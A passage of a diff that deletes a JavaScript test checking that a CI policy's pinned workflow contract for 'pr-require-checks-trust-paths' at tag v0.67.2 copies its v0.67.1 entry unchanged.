-  assert.equal(contracts[key(sha)].allowedCallerPermissions, undefined);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.67.2 reads the trust-path config at the default branch's last commit
-// (ci-workflows#909) and activity in capped, fail-closed pages (ci-workflows#911).
-// The workflow's inputs, job permissions and secrets are unchanged, so the
-// entry copies its v0.67.1 entry forward unchanged.
-test("the pr-require-checks-trust-paths contract at the v0.67.2 tag copies its v0.67.1 entry forward unchanged", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) =>
-    `melodic-software/ci-workflows/.github/workflows/pr-require-checks-trust-paths.yml@${sha}`;
-  const sha = "2097e798cf050506383e1df8d8c0d8c436d9b44c";
-  const prior = contracts[key("4ad14b4f1b4868aa5362590299c93d9117b629f1")];
-  assert.ok(prior);
-  assert.deepEqual(contracts[key(sha)], prior);
-  assert.equal(contracts[key(sha)].routing, "runner-input");
-  assert.deepEqual(contracts[key(sha)].allowedInputs, ["runner", "config-path"]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
 });
